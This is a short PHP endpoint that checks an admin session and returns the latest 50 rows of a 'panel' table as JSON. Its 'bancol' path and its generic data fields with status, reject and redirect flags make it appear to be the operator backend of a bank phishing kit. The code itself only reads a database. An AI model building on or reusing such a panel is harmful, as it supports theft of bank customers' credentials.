<?php
require_once '../bancol/config.php';

if (!isset($_SESSION['admin_logged_in'])) {
    http_response_code(403);
    exit(json_encode(['error' => 'Acceso no autorizado']));
}

$conn = getConnection();
$sql = "SELECT id, dato1, dato2, dato3, dato3_status, rejected_flag, fecha, redirect_flag 
        FROM  panel
        ORDER BY fecha DESC 
        LIMIT 50";

$result = $conn->query($sql);
$data = [];
while($row = $result->fetch_assoc()) {
    $data[] = $row;
}

$conn->close();

header('Content-Type: application/json');
echo json_encode($data);
?>